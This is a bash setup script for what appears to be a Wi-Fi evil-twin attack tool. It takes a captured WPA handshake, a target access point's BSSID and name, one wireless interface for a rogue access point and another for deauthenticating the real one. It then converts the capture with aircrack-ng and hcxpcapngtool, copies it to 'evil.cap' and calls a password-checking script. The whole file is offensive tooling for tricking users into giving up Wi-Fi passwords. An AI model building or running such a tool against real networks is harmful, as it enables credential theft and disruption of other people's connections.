#!/usr/bin/env bash
red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
clear_color='\033[0m'
print_help() {
    printf "${yellow}"
    echo 'Usage: ./init.sh -c path/to/capture/file.cap -b (target AP MAC address/BSSID) -n (network name) -i (wireless interface for AP) -d (wireless interface for deauthing target AP)'
    printf "${clear_color}${green}"
    echo 'ex: ./init.sh -c ~/hs/handshake_TPLink8666.cap -b "69:AF:FC:34:86:33" -n "TP-Link_8666" -i wlan0 -d wlan1'
    printf "${clear_color}"
    exit 1
}
while getopts 'c:b:n:i:d:' option; do
    case $option in 
        c) 
            capfile="$OPTARG"
            ;;
        b)
            bssid="$OPTARG"
            ;;
        n)  
            name="$OPTARG"
            ;;
        i)
            interface="$OPTARG"
            ;;
        d)
            deauth="$OPTARG"
            ;;
        ?)
            print_help
            ;;
    esac
done
if [ -z "$capfile" ]; then
   printf "${red}Path to packet capture file containing 4-way handshake: ${clear_color}"
   read capfile
fi
if [ -z "$bssid" ]; then
    bssid="$(aircrack-ng $capfile 2>/dev/null | grep -oE -m1 "[0-9,A-F]{2}:[0-9,A-F]{2}:[0-9,A-F]{2}:[0-9,A-F]{2}:[0-9,A-F]{2}:[0-9,A-F]{2}")"
    echo "No BSSID explicitly passed"
    printf "Detected BSSID:${yellow} $bssid ${clear_color}from ${red}$capfile${clear_color}\n"
fi
if [ -z "$name" ]; then
    basename="$(printf "$capfile" | rev | cut -c 5- | rev)"
    hc22000_file="$basename.hc22000"
    hcxpcapngtool -o $hc22000_file $capfile > /dev/null
    PWD="$(pwd)"
    python3 $PWD/ssid.py "$(cat $hc22000_file)" > $basename.txt 
    name="$(head -n 1 $basename.txt | cut -c 9-)"
    echo "No Wifi name explicitly passed"
    printf "Detected Wifi name:${green} $name ${clear_color}from ${red}$capfile${clear_color}\n"
fi
if [ -z "$interface" ]; then
    printf "\n${yellow}Wireless interface to use for the access point: ${clear_color}"
    read interface
fi
if [ -z "$deauth" ]; then
    printf "\n${green}Wireless interface to use for deauthentication packets: ${clear_color}"
    read deauth
fi
##this next part is just checking everything worked remove later
echo "capfile: $capfile"
echo "bssid: $bssid"
echo "name: $name"
echo "interface: $interface"
echo "deauth: $deauth"
cp $capfile $PWD/evil.cap
python3 passapi.py $bssid
